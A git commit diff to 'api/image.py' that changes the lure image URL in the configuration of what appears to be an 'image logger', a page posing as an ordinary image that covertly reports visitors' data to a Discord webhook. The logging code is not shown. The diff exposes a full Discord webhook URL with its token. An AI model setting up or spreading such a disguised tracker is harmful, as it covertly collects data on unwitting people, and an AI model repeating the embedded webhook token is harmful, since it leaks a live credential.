28a714847ff035ecbd154542ecca3f5c67e73062
tobyxontop-glitch <tobyxontop@gmail.com>
2026-03-27 23:01:37 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1451296620556718162/iih9pYNT0lkaUKHBQw2EuJb13WsGiAdnVBi8XuOb2Xa_m5OJd4HyGPETHVvkCWeXdrMz",
-    "image": "https://i.pinimg.com/236x/45/2a/ce/452acee6249556bafddd0db9523ad042.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://i.pinimg.com/736x/df/96/d8/df96d84e03317bba5b9961e75382ec37.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
